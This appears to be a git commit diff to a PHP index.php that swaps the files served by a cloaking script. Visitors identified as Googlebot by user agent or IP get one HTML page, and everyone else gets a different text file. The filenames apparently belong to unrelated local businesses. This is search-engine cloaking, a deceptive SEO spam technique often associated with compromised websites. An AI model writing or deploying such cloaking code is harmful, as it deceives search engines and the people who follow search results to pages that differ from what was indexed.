ee96c3f4f7b73aa4117eafa44aebb01996134798
becakdorong84-sketch <becakdorong84@gmail.com>
2025-12-23 22:18:51 +0700

    index.php

--- index.php
+++ index.php
@@ -24,11 +24,11 @@ $isGoogleBot = $isGoogleBotUA || isGooglebotIp($remoteIp);
 
 
 if ($isGoogleBot) {
-include __DIR__ . '/miamilimofl.html';
+include __DIR__ . '/orangedentalandent.html';
 exit;
 }
 
 
-include __DIR__ . '/party-buses-miami.txt';
+include __DIR__ . '/orangedentalandent-com-contact-us.txt';
 exit;
 ?>
